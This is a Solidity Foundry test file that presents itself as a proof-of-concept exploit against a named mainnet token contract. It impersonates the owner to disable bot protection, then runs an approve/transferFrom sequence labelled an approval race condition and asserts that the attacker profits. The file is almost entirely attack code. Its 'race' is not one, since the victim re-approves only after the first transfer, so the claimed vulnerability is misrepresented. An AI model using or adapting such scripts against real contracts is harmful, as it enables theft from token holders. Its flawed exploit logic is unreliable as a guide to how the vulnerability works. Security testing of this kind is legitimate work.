// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface BNRGInterface {
    function balanceOf(address account) external view returns (uint256);
    function approve(address delegate, uint256 numTokens) external returns (bool);
    function transferFrom(address owner, address receiver, uint256 numTokens) external returns (bool);
    function allowance(address owner, address delegate) external view returns (uint256);
    function owner() external view returns (address);
    function setBotProtection(bool enable) external;
    function state() external view returns (uint8);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C;
    address attacker = address(this);
    address victim;
    BNRGInterface BNRG;
    uint256 initialBalance;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        BNRG = BNRGInterface(TARGET);
        vm.label(TARGET, "BNRG Token");
        vm.label(attacker, "Attacker");
        victim = address(0x1337);
        vm.label(victim, "Victim");

        // Unlock the contract to allow transfers
        vm.startPrank(BNRG.owner());
        BNRG.setBotProtection(false); // Sets state to Unlocked
        vm.stopPrank();

        // Give victim tokens
        deal(TARGET, victim, 10000 * 1e18);

        // Record initial attacker balance
        initialBalance = BNRG.balanceOf(attacker);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C).balanceOf(address(this));
        // Step 1: Victim approves attacker for 1000 tokens
        vm.startPrank(victim);
        BNRG.approve(attacker, 1000 * 1e18);
        vm.stopPrank();

        // Step 2: Attacker exploits by transferring the initial 1000 tokens
        BNRG.transferFrom(victim, attacker, 1000 * 1e18);

        // Step 3: Victim tries to reduce approval to 500 tokens (race condition setup)
        vm.startPrank(victim);
        BNRG.approve(attacker, 500 * 1e18);
        vm.stopPrank();

        // Step 4: Attacker transfers again with the new approval
        BNRG.transferFrom(victim, attacker, 500 * 1e18);

        // Verify profit: attacker should have gained 1500 tokens total
        uint256 finalBalance = BNRG.balanceOf(attacker);
        assertGt(finalBalance, initialBalance, "Attacker balance did not increase");
        assertEq(finalBalance - initialBalance, 1500 * 1e18, "Attacker did not gain expected amount");
        uint256 finalBalanceERC20 = IERC20(0xd8813B5Dfa9AbEB693F217Bb905ec99B66FB017C).balanceOf(address(this));
        assertGt(finalBalanceERC20, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

